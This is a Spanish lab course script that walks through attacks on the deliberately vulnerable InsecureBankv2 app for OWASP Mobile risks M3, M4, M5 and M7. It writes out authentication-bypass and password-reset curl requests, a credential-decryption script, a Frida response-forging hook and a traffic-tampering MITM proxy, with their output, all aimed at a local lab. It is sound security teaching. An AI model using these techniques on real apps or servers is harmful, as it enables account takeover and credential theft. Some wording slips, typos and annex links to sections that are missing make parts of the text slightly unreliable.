# Clase 2 — OWASP Mobile Top 10: M3, M4, M5 y M7

> **Estado del documento: verificado de extremo a extremo** contra una VM real
> (Android 8.1.0, API 27, `x86_64`, root por ADB) con `systemd` real en el
> servidor. Todas las salidas marcadas como «salida real» se capturaron durante
> la sesión de verificación, no son reconstrucciones. La transcripción completa
> está en [`clase-2-evidencia.md`](clase-2-evidencia.md).

| | |
|---|---|
| **App objetivo** | InsecureBankv2 (`com.android.insecurebankv2`) |
| **Proyecto** | Dinesh Shetty — referenciado por OWASP MASTG como `MASTG-APP-0010` |
| **Dispositivo** | VM Android-x86, API 27, `x86_64`, root por ADB |
| **Duración** | 120 minutos |
| **Riesgos** | M3 Insecure Authentication · M4 Insufficient Cryptography · M5 Insecure Communication · M7 Client Code Quality |
| **Depende de** | La Clase 1 (backend en 8888, app instalada, descompilación en `reports/jadx/`) |

## Índice

- [Antes de impartir la clase](#antes-de-impartir-la-clase)
- [Fase 0 — Preparación](#fase-0--preparación)
- [Fase 1 — M3: Autenticación insegura](#fase-1--m3-autenticación-insegura)
- [Fase 2 — M4: Criptografía insuficiente](#fase-2--m4-criptografía-insuficiente)
- [Fase 3 — M5: Comunicación insegura](#fase-3--m5-comunicación-insegura)
- [Fase 4 — M7: Calidad de código del cliente](#fase-4--m7-calidad-de-código-del-cliente)
- [Cierre](#cierre)
- [Anexo A — Hallazgos verificados](#anexo-a--hallazgos-verificados)
- [Anexo B — Errores del guion anterior](#anexo-b--errores-del-guion-anterior)

---

## Antes de impartir la clase

Esta clase continúa donde terminó la 1: misma app, mismo backend, misma
descompilación. Los hallazgos de M1, M2 y M6 ya están sobre la mesa y aquí se
usan como plataforma.

> **Aviso sobre el orden de la clase.** M3 y M5 son los riesgos con impacto
> directo y se demuestran primero, con la app real. M4 y M7 se demuestran
> leyendo código. La instrumentación (Frida) va al final de la fase M3, como
> complemento: **la clase funciona aunque `frida-server` no esté disponible**,
> porque los dos hallazgos principales de M3 no lo necesitan.

### Requisitos previos

| Componente | Verificación | Si falla |
|---|---|---|
| Backend activo | `bank-status` | `bank-start` |
| App instalada y configurada | `clase1-prep` (de la Clase 1) | repetirlo |
| Descompilación de JADX | `ls ~/mobile-owasp-lab/reports/jadx/InsecureBankv2/sources` | ver Fase 0 |
| `frida-server` en la VM (**opcional**) | `frida-ps -Uai` | las fases 1.1 y 1.2 siguen; se pierde la 1.5 |
| Proxy M5 (`mitm-m5.py`) | `python3 docs/clases/mitm-m5.py --help` | está en el repositorio |

---

## Fase 0 — Preparación

```bash
bank-status                       # el backend responde
vmconnect                         # conecta y activa root
ls ~/mobile-owasp-lab/reports/jadx/InsecureBankv2/sources/com/android/insecurebankv2/
```

Si no existe la descompilación (se hizo en la Clase 1, pero por si acaso):

```bash
mkdir -p ~/mobile-owasp-lab/reports/jadx
jadx ~/mobile-owasp-lab/apps/apk/InsecureBankv2.apk \
     -d ~/mobile-owasp-lab/reports/jadx/InsecureBankv2
```

Comprobar el backend, que sin él no hay clase:

```bash
curl -s -X POST --data-urlencode 'username=dinesh' \
     --data-urlencode 'password=Dinesh@123$' http://127.0.0.1:8888/login
```

Salida real:

```console
{"message": "Correct Credentials", "user": "dinesh"}
```

---

## Fase 1 — M3: Autenticación insegura

La pregunta de M3 es siempre la misma: **¿qué impide que alguien entre sin ser
quien dice ser?** Vamos a responderla con cuatro ataques, en orden de
creatividad.

### 1.1 El endpoint que no comprueba nada (`/devlogin`)

Antes de tocar la app, mira el backend. Lee el endpoint de login de
desadministrador:

```bash
sed -n '/def devlogin/,/^$/p' \
  ~/mobile-owasp-lab/tools/InsecureBankv2Server/app.py
```

Salida real (`app.py:128`):

```python
@app.route('/devlogin', methods=['POST'])
def devlogin():
    user=request.form['username']
    Responsemsg="Correct Credentials"
    data = {"message" : Responsemsg, "user": user}
    print(makejson(data))
    return makejson(data)
```

> **Esto no es un fallo de comparación de contraseñas. Es la ausencia total de
> comparación.** No lee la contraseña. No consulta la base de datos. No tiene
> salida por donde negarse: cualquier usuario con cualquier contraseña obtiene
> `"Correct Credentials"`.

Compruébalo:

```bash
for p in "" "x" "esta-no-es-la-contraseña"; do
  printf '  devadmin / %-26s -> ' "\"$p\""
  curl -s -X POST --data-urlencode "username=devadmin" \
       --data-urlencode "password=$p" http://127.0.0.1:8888/devlogin
  echo
done
```

Salida real:

```console
  devadmin / ""                          -> {"message": "Correct Credentials", "user": "devadmin"}
  devadmin / "x"                         -> {"message": "Correct Credentials", "user": "devadmin"}
  devadmin / "esta-no-es-la-contraseña"  -> {"message": "Correct Credentials", "user": "devadmin"}
```

Y con un usuario que no existe en la base de datos:

```bash
curl -s -X POST -d 'username=usuario-fantasma&password=x' http://127.0.0.1:8888/devlogin
```

```console
{"message": "Correct Credentials", "user": "usuario-fantasma"}
```

#### Ahora, en la app real

Y aquí está el giro que lo convierte en un bypass completo y no en un detalle
del backend. La app **elige el endpoint en el cliente**:

```bash
grep -n "devadmin\|httppost2\|/devlogin" \
  ~/mobile-owasp-lab/reports/jadx/InsecureBankv2/sources/com/android/insecurebankv2/DoLogin.java
```

Salida real (`DoLogin.java:103`):

```java
if (DoLogin.this.username.equals("devadmin")) {
    httppost2.setEntity(new UrlEncodedFormEntity(nameValuePairs));
    responseBody = httpclient.execute(httppost2);
}
```

> **La decisión de qué endpoint usar se toma en el cliente**, comparando el
> usuario con la cadena literal `"devadmin"`. Escribiendo `devadmin` en el
> campo de usuario, el usuario hace que la app elija el endpoint que no valida
> nada. No hace falta instrumentación, ni parchear la APK, ni conocer ninguna
> contraseña.

**Demostración en la app** (20 segundos, sin comandos):

1. Abrir InsecureBankv2.
2. Usuario: `devadmin`. Contraseña: cualquier cosa, por ejemplo `inventada999`.
3. Pulsar **Login**.

La app entra en `PostLogin`. Compruébalo:

```bash
adb -s 172.25.208.100:5555 shell dumpsys window | grep mCurrentFocus
```

Salida real:

```console
    mCurrentFocus=Window{...com.android.insecurebankv2/com.android.insecurebankv2.PostLogin}
```

Y el rastro delata que la credencial falsa se aceptó como buena:

```bash
adb -s 172.25.208.100:5555 logcat -d | grep "Successful Login"
```

Salida real:

```console
10-01 15:18:40.807  4417  4437 D Successful Login:: , account=devadmin:inventada999
```

> **M6 y M3 en la misma línea de log.** La app ha registrado en el log del
> sistema un login que el servidor nunca validó. Una conclusión de la Clase 1 («el log
> de M6 solo se emite cuando el backend responde Correct Credentials») queda
> confirmado: aquí el backend nunca lo dijo, y aun así el log aparece, porque la
> respuesta forzada del endpoint lo dio por aprobado.

La app también guardó las credenciales falsas en sus `SharedPreferences`,
cifradas con la clave de M1/M4 de la Clase 1:

```bash
adb -s 172.25.208.100:5555 shell \
  "cat /data/data/com.android.insecurebankv2/shared_prefs/mySharedPreferences.xml"
```

Salida real:

```xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="superSecurePassword">FXYA/8Ki33dG4NlHsGlAtQ==&#10;    </string>
    <string name="EncryptedUsername">ZGV2YWRtaW4=&#13;&#10;    </string>
</map>
```

Descifrado con la clave de la Clase 1:

```bash
PY_BIN=~/mobile-owasp-lab/tools/InsecureBankv2Server/venv/bin/python
"$PY_BIN" - <<'PY'
import base64
from Crypto.Cipher import AES
key = b"This is the super secret key 123"      # M1/M4  CryptoClass.java:22
iv  = b"\x00" * 16                            # M1/M4  CryptoClass.java:23
def desc(b): return AES.new(key, AES.MODE_CBC, iv).decrypt(base64.b64decode(b)).rstrip(b"\n\r").decode()
print("  superSecurePassword ->", desc("FXYA/8Ki33dG4NlHsGlAtQ=="))
print("  'EncryptedUsername' ->", base64.b64decode("ZGV2YWRtaW4=").decode(), "(solo Base64)")
PY
```

Salida real:

```console
  superSecurePassword -> inventada999
  'EncryptedUsername' -> devadmin (solo Base64)
```

> **El bypass no es un efecto transitorio:** la credencial inventada queda
> guardada en el dispositivo, cifrada con la clave de M4, y el descifrado de la
> Clase 1 la recupera. Un atacante que entre por aquí se queda con una sesión
> persistente.

### 1.2 El endpoint que cambia contraseñas sin pedir la actual (`/changepassword`)

El mismo backend, otro agujero. Este endpoint **no pide la contraseña actual**:

```bash
sed -n '/def changepassword/,/return makejson/p' \
  ~/mobile-owasp-lab/tools/InsecureBankv2Server/app.py
```

Salida real (`app.py:73`):

```python
@app.route('/changepassword', methods=['POST'])
def changepassword():
    ...
    u = User.query.filter(User.username == user).first()
    if not u:
        Responsemsg="Error"
    else:
        Responsemsg="Change Password Successful"
        u.password = newpassword
        db_session.commit()
```

> **No hay `if u.password == ...`.** Basta conocer el **nombre de usuario**
> para reescribirle la contraseña. La contraseña que envías en `password` no se
> mira: el endpoint ni siquiera la lee.

Demostración. **Antes**, el estado de la base de datos:

```bash
sqlite3 ~/mobile-owasp-lab/tools/InsecureBankv2Server/mydb.db \
  "select username, password from users;"
```

```console
dinesh|Dinesh@123$
jack|Jack@123$
```

Cambio la contraseña de `dinesh` sin saber su contraseña, usando la de `jack`
como seña irrelevante:

```bash
curl -s -X POST -d 'username=dinesh&newpassword=RESETEADA-123&password=lo-que-sea' \
     http://127.0.0.1:8888/changepassword
```

```console
{"message": "Change Password Successful"}
```

Y ahora `dinesh` entra con la contraseña que **yo** he elegido:

```bash
curl -s -X POST --data-urlencode 'username=dinesh' \
     --data-urlencode 'password=RESETEADA-123' http://127.0.0.1:8888/login
```

```console
{"message": "Correct Credentials", "user": "dinesh"}
```

> **Toma de control de una cuenta completa sin credenciales.** No es un
> bruteforce: es un endpoint que hace exactamente lo que le piden. Combinado
> con 1.1, el atacante entra como `devadmin` y reescribe la contraseña de
> cualquier usuario.

**Restaurar el laboratorio** (importante antes de la siguiente fase):

```bash
curl -s -X POST -d 'username=dinesh&newpassword=Dinesh@123$&password=lo-que-sea' \
     http://127.0.0.1:8888/changepassword; echo
sqlite3 ~/mobile-owasp-lab/tools/InsecureBankv2Server/mydb.db \
  "select username, password from users;"
```

```console
dinesh|Dinesh@123$
jack|Jack@123$
```

> **Y un detalle de M6 en el servidor:** el `print(newpassword)` de
> `changepassword` (`app.py:85`) escribe la contraseña nueva en el log del
> servicio. Ver la nota de la [Fase 3](#por-qué-el-log-del-backend-parece-vacío)
> antes de intentar verlo con `journalctl`.

### 1.3 Sin límite de intentos

El resto de endpoints (`/login`, `/getaccounts`, `/dotransfer`) sí comparan la
contraseña, y por eso son los que la app usa de verdad. Pero ninguno de ellos
implementa ninguna medida contra fuerza bruta:

| Control | ¿Existe? |
|---|---|
| Límite de intentos por minuto | No |
| Bloqueo tras N fallos | No |
| CAPTCHA | No |
| Notificación al usuario del intento sospechoso | No |
| Registro de intentos fallidos | No |

Compruébalo contra el código del backend: no hay ni un `sleep`, ni un contador,
ni un decorador de rate limit en el fichero entero.

```bash
grep -cnE "sleep|rate|limit|attempt|lockout|captcha" \
  ~/mobile-owasp-lab/tools/InsecureBankv2Server/app.py
```

Salida real: `0`.

Demostración de que acepta cualquier número de intentos, uno tras otro:

```bash
for i in $(seq 1 5); do
  printf '  intento %d: ' "$i"
  curl -s -X POST -d "username=dinesh&password=incorrecta-$i" \
       http://127.0.0.1:8888/login
  echo
done
```

Salida real:

```console
  intento 1: {"message": "Wrong Password", "user": "dinesh"}
  intento 2: {"message": "Wrong Password", "user": "dinesh"}
  intento 3: {"message": "Wrong Password", "user": "dinesh"}
  intento 4: {"message": "Wrong Password", "user": "dinesh"}
  intento 5: {"message": "Wrong Password", "user": "dinesh"}
```

> Cinco rechazos, ninguna consecuencia. Y una observación sobre el diseño:
> **`/login` devuelve mensajes distintos** según el fallo —`Wrong Password`
> para usuario existente, `User Does not Exist` para usuario inexistente.
> Eso es un **oráculo de enumeración de usuarios**: basta mirar la respuesta
> para saber qué nombres de usuario existen. Un atacante empieza su lista por
> los que devuelven `Wrong Password`, porque son los que vale la pena atacar.

### 1.4 Lo que el cliente hace con la respuesta

El punto exacto donde la app decide si el login es válido:

```bash
sed -n '96,125p' \
  ~/mobile-owasp-lab/reports/jadx/InsecureBankv2/sources/com/android/insecurebankv2/DoLogin.java
```

Salida real (`DoLogin.java:112-118`):

```java
InputStream in = responseBody.getEntity().getContent();
DoLogin.this.result = convertStreamToString(in);
DoLogin.this.result = DoLogin.this.result.replace("\n", "");
if (DoLogin.this.result != null) {
    if (DoLogin.this.result.indexOf("Correct Credentials") != -1) {
        Log.d("Successful Login:", ", account=" + DoLogin.this.username + ":" + DoLogin.this.password);
        saveCreds(DoLogin.this.username, DoLogin.this.password);
        trackUserLogins();
        ...
```

> **Todo el control de acceso de la app es un `indexOf` sobre el texto de la
> respuesta.** No hay validación local, no hay estado de sesión firmado, no hay
> nada que un atacante en el dispositivo pueda falsear hooking. Y la comparación
> es por **subcadena**: cualquier respuesta que contenga la frase
> `Correct Credentials` vale, en cualquier parte y con el usuario que sea.
>
> Esto explica por qué los hooks de autenticación habituales no funcionan en
> esta app, y es la razón de que la fase 1.5 hookee la respuesta en lugar de
> «el login».

### 1.5 Bypass con Frida (complemento)

> **Esta sección es opcional.** Si `frida-server` no está corriendo en la VM,
> ciérrala y sigue: los hallazgos 1.1 y 1.2 son más potentes y no dependen de
> instrumentación.

Preparar `frida-server` en la VM:

```bash
vmconnect frida        # imprime la URL y los comandos ya rellenados
```

Salida real:

```
==> frida-server para ESTA VM  (ABI x86_64, versión cliente 17.19.0)

  wget https://github.com/frida/frida/releases/download/17.19.0/frida-server-17.19.0-android-x86_64.xz
  xz -d frida-server-17.19.0-android-x86_64.xz
  mv frida-server-17.19.0-android-x86_64 frida-server-android-x86_64

  adb -s 172.25.208.100:5555 push frida-server-android-x86_64 /data/local/tmp/
  adb -s 172.25.208.100:5555 shell 'chmod +x /data/local/tmp/frida-server-android-x86_64'
  adb -s 172.25.208.100:5555 shell '/data/local/tmp/frida-server-android-x86_64 &'
```

Comprobar:

```bash
frida-ps -Uai | grep -i insecurebank
```

Salida real:

```console
   -  InsecureBankv2     com.android.insecurebankv2
```

> **Aviso:** en Frida 16+ el flag `--no-pause` **ya no existe**. Si lo usas,
> el comando falla con `unrecognized arguments`. La app se reanuda sola al
> cargar el script; para dejarla parada, el flag es `--pause`.

Lanzar el hook (está en [`hook-m3-bypass.js`](hook-m3-bypass.js)):

```bash
cd ~/owasp-mobile-course            # o donde tengas el repositorio
frida -U -f com.android.insecurebankv2 -l docs/clases/hook-m3-bypass.js
```

> **Por qué este hook y no uno de «validación de login».** InsecureBankv2 no
> tiene ningún método local que valide las credenciales, así que no hay nada
> que hookear en «el login». El hook intercepta
> `DoLogin$RequestTask.convertStreamToString()`, el punto donde la respuesta del
> servidor se convierte en texto, y sustituye su valor por una respuesta
> inventada. El resultado es más fuerte que falsificar un login: la app acepta
> **cualquier** respuesta, incluso si el backend está apagado.

Salida real al hacer login en la app con `dinesh` / `CLAVE-MALISIMA-XYZ`:

```
Spawned `com.android.insecurebankv2`. Resuming main thread!
[*] Hook M3 instalado en DoLogin$RequestTask.convertStreamToString
[*] Hecho. Haz login en la app con cualquier usuario y cualquier clave.
[MITM] Respuesta REAL del backend: {"message": "Wrong Password", "user": "dinesh"}

[MITM] Respuesta FORZADA:              {"message": "Correct Credentials", "user": "inyectado-por-frida"}
[MITM] La app acaba de aceptar un login que el backend NUNCA aprobo.
```

La app entra en `PostLogin` con una contraseña que el servidor rechazó:

```bash
adb -s 172.25.208.100:5555 logcat -d | grep "Successful Login"
```

```console
10-01 15:21:30.052  4620  4644 D Successful Login:: , account=dinesh:CLAVE-MALISIMA-XYZ
```

> **El servidor dijo «Wrong Password» y la app entró igual.** Esa es la
> definición de M3: la decisión de acceso se toma a partir de un dato que el
> cliente no puede verificar, en un dispositivo bajo control del atacante.

---

## Fase 2 — M4: Criptografía insuficiente

M4 ya apareció en la Clase 1 como parte de la cadena M1→M2. Aquí se estudia
por sí mismo, y se le añade un hallazgo que no estaba en el guion anterior: la
firma de la APK.

### 2.1 La clave que viaja dentro de la APK

```bash
sed -n '20,24p' \
  ~/mobile-owasp-lab/reports/jadx/InsecureBankv2/sources/com/android/insecurebankv2/CryptoClass.java
```

Salida real (`CryptoClass.java:22`):

```java
String key = "This is the super secret key 123";
```

> No es `static`, no es `final`, y no se llama `SECRET_KEY`. Es un campo de
> instancia con la clave escrita en el código que viaja dentro del APK.
> Cualquiera descomprime la APK y la lee. Android ofrece el **Keystore** para
> material criptográfico; no usarlo, y meter la clave en el código, es usar mal
> la plataforma.

### 2.2 El IV de dieciséis ceros

`CryptoClass.java:23`:

```java
byte[] ivBytes = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
```

> El vector de inicialización es constante. En modo CBC eso **anula la
> confidencialidad**: dos mensajes que empiecen igual producen el mismo
> criptograma, y un atacante puede distinguir bloques repetidos. Cero es lo
> opuesto a aleatorio.

### 2.3 Modo de operación y ausencia de autenticación

```bash
grep -n "Cipher.getInstance\|Cipher.init" \
  ~/mobile-owasp-lab/reports/jadx/InsecureBankv2/sources/com/android/insecurebankv2/CryptoClass.java
```

Salida real (`CryptoClass.java:28` y `:36`):

```java
Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
```

| Problema | Consecuencia |
|---|---|
| AES en modo **CBC** | Vulnerable a ataques de padding oracle: un atacante que pueda distinguir «padding válido» de «padding inválido» puede descifrar el texto sin conocer la clave |
| IV constante | Dos mensajes con el mismo prefijo producen el mismo criptograma |
| Sin **autenticación** (no hay MAC, ni GCM) | El criptograma se puede modificar sin que nadie lo detecte |
| Sin **derivación** de clave (no hay PBKDF2 ni scrypt) | La clave es la contraseña escrita a mano |

> **Y además, los datos que se cifran no son la contraseña**, sino una
> contraseña que el usuario ha escrito. O sea: la app guarda la contraseña
> «protegida», pero la protección depende de una clave que está en el propio
> fichero protegido.

### 2.4 Descifrar lo «cifrado»

```bash
PY_BIN=~/mobile-owasp-lab/tools/InsecureBankv2Server/venv/bin/python
"$PY_BIN" - <<'PY'
import base64
from Crypto.Cipher import AES
key = b"This is the super secret key 123"   # CryptoClass.java:22
iv  = b"\x00" * 16                          # CryptoClass.java:23
blob = "DTrW2VXjSoFdg0e61fHxJg=="           # superSecurePassword
print(AES.new(key, AES.MODE_CBC, iv).decrypt(base64.b64decode(blob)).rstrip(b"\n\r").decode())
PY
```

Salida real:

```console
Dinesh@123$
```

### 2.5 La APK solo está firmada con v1 (vulnerabilidad Janus)

Este hallazgo **no estaba** en el guion anterior, y no lo da el código: lo da
la firma.

```bash
export PATH="$PATH:/opt/android-sdk/build-tools/33.0.2"
apksigner verify --verbose ~/mobile-owasp-lab/apps/apk/InsecureBankv2.apk
```

Salida real:

```console
Verified using v1 scheme (JAR signing): true
Verified using v2 scheme (APK Signature Scheme v2): false
Verified using v3 scheme (APK Signature Scheme v3): false
Verified using v3.1 scheme (APK Signature Scheme v3.1): false
Verified using v4 scheme (APK Signature Scheme v4): false
```

> **La APK sólo está firmada con v1 (JAR signing).** La **vulnerabilidad Janus**
> (CVE-2017-13156) permite a un atacante prepender un DEX a la APK **sin invalidar
> la firma v1**, y en Android 5.0–8.0 el código inyectado se ejecuta. La VM del
> laboratorio es Android 8.1, justo en el rango afectado.
>
> La app declara `minSdk 15`, así que no puede usar v2 sin perder compatibilidad
> con Android 4.x. Esa es la tensión real: **firmar solo con v1 para ser
> compatible con lo antiguo es abrir la puerta a inyección de código**. La
> solución es firmar con v2+v3 (que no rompen nada) y, si de verdad hace falta
> compatibilidad con Android 4, gastar un diseño de claves rotatorio.

---

## Fase 3 — M5: Comunicación insegura

### 3.1 El protocolo, hardcodeado

```bash
grep -rn 'String protocol' \
  ~/mobile-owasp-lab/reports/jadx/InsecureBankv2/sources/com/android/insecurebankv2/*.java
```

Salida real:

```console
ChangePassword.java:57:    String protocol = "http://";
DoLogin.java:51:    String protocol = "http://";
DoTransfer.java:65:    String protocol = "http://";
```

> Tres clases, tres veces el mismo `http://` escrito a mano. No hay HTTPS en
> ninguna parte de la app, y el cliente HTTP usado lo confirma: la app instancia
> `DefaultHttpClient` de Apache, que además va anunciando su versión en cada
> petición.

### 3.2 Interceptar el tráfico de la app

> **Por qué un proxy propio y no Burp.** El guion anterior mandaba usar Burp
> Suite. Burp es una aplicación Swing: **en el servidor headless del laboratorio
> no arranca** (sin Xvfb no hay display, y el lanzador `/usr/local/bin/burpsuite`
> no existe: el binario real está en `/opt/burpsuite/app`). Para que la fase sea
> impartible y reproducible sin escritorio, el repositorio incluye
> [`mitm-m5.py`](mitm-m5.py), que hace lo mismo para el caso de esta app.
> Si tienes Burp en un equipo con escritorio, el procedimiento equivalente está
> en el [Anexo C](#anexo-c--equivalente-con-burp-suite).

Arrancar el proxy:

```bash
python3 docs/clases/mitm-m5.py --port 8080 --target 127.0.0.1:8888
```

Salida real:

```console
[MITM] Escuchando en 0.0.0.0:8080
[MITM] Reenviando a 127.0.0.1:8888
[MITM] Modo: solo observar
[MITM] En la VM: adb shell settings put global http_proxy <IP_SERVIDOR>:8080
```

En una terminal aparte, apuntar la VM al proxy:

```bash
adb -s 172.25.208.100:5555 shell settings put global http_proxy 172.25.208.104:8080
adb -s 172.25.208.100:5555 shell am force-stop com.android.insecurebankv2
adb -s 172.25.208.100:5555 shell am start -n com.android.insecurebankv2/.LoginActivity
```

**En la app:** login con `dinesh` / `Dinesh@123$`.

Salida real del proxy:

```console
[MITM] Conexion entrante desde 172.25.208.100
[MITM] POST /login  ->  172.25.208.104:8888

[MITM] Cabeceras de la peticion (la app NO usa HTTPS):
    Content-Length: 40
    Content-Type: application/x-www-form-urlencoded
    Host: 172.25.208.104:8888
    Connection: Keep-Alive
    User-Agent: Apache-HttpClient/UNAVAILABLE (java 1.4)

[MITM] Cuerpo de la peticion:  (40 bytes)
    username=dinesh
    password=Dinesh%40123%24   <-- CONTRASENA EN CLARO, sin cifrar

[MITM] HTTP/1.1 200 OK

[MITM] Cuerpo de la respuesta:  (52 bytes)
    {"message": "Correct Credentials", "user": "dinesh"}

[MITM] Todo lo anterior es M5: sin HTTPS, sin certificate pinning, y con las credenciales en claro.
```

> Ahí está M5 entero, en una sola petición. La contraseña viaja en claro
> (`Dinesh@40123%24` es `Dinesh@123$` con el URL-encoding). Quien esté en el
> camino la lee, la cambia o la reutiliza. Y el `User-Agent`
> `Apache-HttpClient/UNAVAILABLE (java 1.4)` le dice además que no se negocia
> nada: es HTTP/1.1 sobre Apache, sin una sola pista de que exista TLS.

### 3.3 Modificar el tráfico en vuelo

Observar el tráfico ya demuestra M5. Alterarlo demuestra que además se pierde
la **integridad**, que es la otra mitad del riesgo.

```bash
# En el servidor, parar el proxy anterior y relanzarlo con --tamper
python3 docs/clases/mitm-m5.py --port 8080 --target 127.0.0.1:8888 --tamper
```

En la app, login con una contraseña **incorrecta**, por ejemplo
`dinesh` / `CLAVE-XYZ`.

Salida real del proxy:

```console
[MITM] Cuerpo de la peticion:  (40 bytes)
    username=dinesh
    password=CLAVE-XYZ   <-- CONTRASENA EN CLARO, sin cifrar

[MITM] Peticion ALTERADA: el usuario dinesh se ha cambiado por jack.
[MITM] Content-Length ajustado: 40 -> 38
[MITM] El backend no tiene ninguna forma de detectar que la peticion viene de un intermediario.

[MITM] HTTP/1.1 200 OK

[MITM] Cuerpo de la respuesta:  (44 bytes)
    {"message": "Wrong Password", "user": "jack"}

[MITM] Respuesta ALTERADA:
[MITM]   real del backend: {"message": "Wrong Password", "user": "jack"}
[MITM]   servida a la app:  {"message": "Correct Credentials", "user": "jack"}
[MITM]   Un login FALLIDO acaba de convertirse en uno exitoso sin tocar el servidor.
```

La app entra en `PostLogin`:

```console
    mCurrentFocus=Window{...com.android.insecurebankv2/com.android.insecurebankv2.PostLogin}
```

Y el log del sistema lo registra:

```console
10-01 15:30:12.114  5445  5481 D Successful Login:: , account=dinesh:CLAVE-XYZ
```

> **Una contraseña que el servidor rechazó se convirtió en una sesión
> iniciada**, cambiando una respuesta de 44 bytes. Sin TLS no hay integridad
> que verificar: el cliente confía ciegamente en lo que le llega, y eso es
> exactamente lo que la [Fase 1.4](#14-lo-que-el-cliente-hace-con-la-respuesta)
> formaliza.
>
> **Detalle fino que importa en clase:** la app no comprueba el campo
> `message`, busca la subcadena `"Correct Credentials"` en la respuesta entera
> (`DoLogin.java:114`). Por eso «cambiar `Wrong` por `Correct`» **no** funciona:
> sale `Correct Password`, que no contiene la frase. Hay que falsificar la
> respuesta completa.

Devolver la VM a su estado normal (importante, o el móvil se queda sin red):

```bash
adb -s 172.25.208.100:5555 shell settings put global http_proxy :0
adb -s 172.25.208.100:5555 shell am force-stop com.android.insecurebankv2
```

### 3.4 Lo que M5 debería hacerse, y por qué aquí no hay nada que bypassear

La respuesta completa a M5 no es «pon HTTPS»:

| Control | Qué evita | ¿Lo tiene InsecureBankv2? |
|---|---|---|
| **HTTPS** (TLS) | Confidencialidad e integridad del canal, y autentica al servidor | No |
| **Certificate pinning** | Que un proxy con una CA propia pueda interceptar TLS | Irrelevante: no hay TLS |
| **Validación del hostname** | Nada si no hay TLS | No aplica |

> **El certificate pinning se explica aquí como defensa en profundidad, no como
>Arrancando un bypass.** El guion anterior incluía un script de Frida para
> saltarse el pinning de esta app, lo cual no tiene sentido: si la app no usa
> TLS, no hay nada que bypassear. El pinning se defiende contra el
> intermediario **una vez que ya has puesto HTTPS**, porque entonces el
> certificado del intercambio sí es verificable, pero un proxy con CA instalada en
> el dispositivo lo sería también.

Si algún alumno pregunta cómo se bypassea el pinning en una app que sí lo
tenga, la respuesta corta es: hookeando el `TrustManager` o el
`HostnameVerifier` con Frida, o usando un repositorio de CA como
mitmproxy. No hace falta un script en este guion porque aquí no hay nada que
bypassear, y un script que no se puede ejecutar en la demo es peor que no
tenerlo.

#### Por qué el log del backend parece vacío

Si haces la fase 1.2 y miras `journalctl` esperando ver la contraseña nueva, no
aparecerá nada:

```bash
sudo journalctl -u insecurebankv2-server -f
```

> **No es que el backend no registre.** `changepassword` hace
> `print(newpassword)` (`app.py:85`) y todos los endpoints imprimen su respuesta
> JSON con `print`. Lo que pasa es que **Python bloquea stdout en bloques de
> 4–8 KB cuando no hay terminal**, así que los mensajes se quedan en el buffer
> y llegan al journal a trozos, cuando el buffer se llena.
>
> **No concluyáis que el backend no loguea.** Es el mismo gotcha que hizo pensar
> en su día que ADB estaba roto. Para verlo en vivo, hay que lanzar el proceso
> sin buffer:
>
> ```bash
> PYTHONUNBUFFERED=1 python3 app.py --port 8888
> ```

---

## Fase 4 — M7: Calidad de código del cliente

M7 es el riesgo que hace que los otros sean fciles de encontrar y de explotar.
Aquí se demuestra con lo que ya hay en la descompilación, sin herramientas
adicionales.

### 4.1 Nombres y ausencia de ofuscación

```bash
grep -rn "String key\|ivBytes\|superSecurePassword\|rememberme" \
  ~/mobile-owasp-lab/reports/jadx/InsecureBankv2/sources/com/android/insecurebankv2/CryptoClass.java
```

Salida real:

```console
CryptoClass.java:21:    String base64Text;
CryptoClass.java:22:    String key = "This is the super secret key 123";
CryptoClass.java:23:    byte[] ivBytes = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
```

> `key`, `ivBytes`, `rememberme_password`, `superSecurePassword`. La app se
> se expone con nombres que describen exactamente lo que hacen. Un atacante tarda
> minutos en entender la lógica. La ofuscación no arregla M4 —la clave sigue
> dentro—, pero subiría el coste de encontrarla.

### 4.2 Manejo de errores que se traga las excepciones

```bash
grep -rn "catch (.*) {}\|catch (.*Exception" \
  ~/mobile-owasp-lab/reports/jadx/InsecureBankv2/sources/com/android/insecurebankv2/*.java \
  | head -10
```

Salida real (extracto):

```console
DoLogin.java:104:            } catch (IOException | InvalidAlgorithmParameterException | InvalidKeyException | NoSuchAlgorithmException | BadPaddingException | ... e) {
DoLogin.java:105:                e.printStackTrace();
DoLogin.java:106:                return null;
```

> `e.printStackTrace()` y `return null`. El error se imprime y se descarta: la
> app no distingue entre «el servidor no responde», «las credenciales son
> erróneas» y «el backend devolvió una respuesta que no entiendo». Para el
> usuario es un pantalla en blanco; para el atacante, una app que **no falla de
> forma observable**, que es lo que hace difícil detectar un ataque.

### 4.3 Sin validación de entradas

```bash
grep -rn "request.form\[" ~/mobile-owasp-lab/tools/InsecureBankv2Server/app.py
```

Salida real: aparecen 10 veces, y **ninguna** comprueba nada antes de usar el
valor:

```python
user = request.form['username']
password = request.form['password']
```

> Sin longitud máxima, sin tipo, sin formato. Y el daño se ve en
> `dotransfer`, que convierte el importe sin validar:

```python
to_account.balance += int(request.form['amount'])
from_account.balance -= int(request.form['amount'])
```

Un `amount` no numérico revienta la petición con un 500; un `amount` negativo
invierte la transferencia. En una app real, esto es la puerta de entrada a SQL
injection o command injection.

### 4.4 Permisos que la app no necesita

```bash
aapt dump permissions ~/mobile-owasp-lab/apps/apk/InsecureBankv2.apk
```

Salida real: la app declara 12 permisos, de los cuales **8 son peligrosos**:

| Permiso | Por qué es peligroso |
|---|---|
| `SEND_SMS` | Enviar SMS de tarificación sin consentimiento |
| `READ_CONTACTS` | Leer la agenda del usuario |
| `READ_CALL_LOG` | Leer el registro de llamadas |
| `READ_PHONE_STATE` | Identificadores del dispositivo y de la SIM |
| `GET_ACCOUNTS` | Cuentas de Google y del dispositivo |
| `ACCESS_COARSE_LOCATION` | Ubicación aproximada |
| `READ_EXTERNAL_STORAGE` | Leer ficheros del usuario |
| `WRITE_EXTERNAL_STORAGE` | Escribir en el almacenamiento compartido |

> **Ocho permisos peligrosos para una app que sólo hace login y consulta
> saldos.** Una app bancaria legítima necesita lo mismo que una app de banca
> móvil: `INTERNET` y poco más. Los otros siete no los usa el código (salvo
> un `BroadcastReceiver` que revisa SMS entrantes) y son exactamente la lista
> que busca el malware.
>
> Un permiso no usado es una superficie de ataque que has entregado sin
> necesidad. **El manifiesto hay que revisarlo como el código.**

